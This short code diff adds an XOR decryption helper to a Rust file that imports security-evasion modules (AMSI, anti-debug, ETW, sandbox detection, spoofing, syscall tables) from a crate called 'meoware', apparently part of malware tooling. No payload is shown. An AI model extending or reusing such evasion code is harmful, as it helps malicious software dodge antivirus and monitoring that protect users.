@@ -1,5 +1,10 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
+
+fn _xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
+    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
+}
+
 use meoware::core::{amsi, anti_debug, etw, sandbox, spoof, ssn_table};
 use meoware::debug;
 
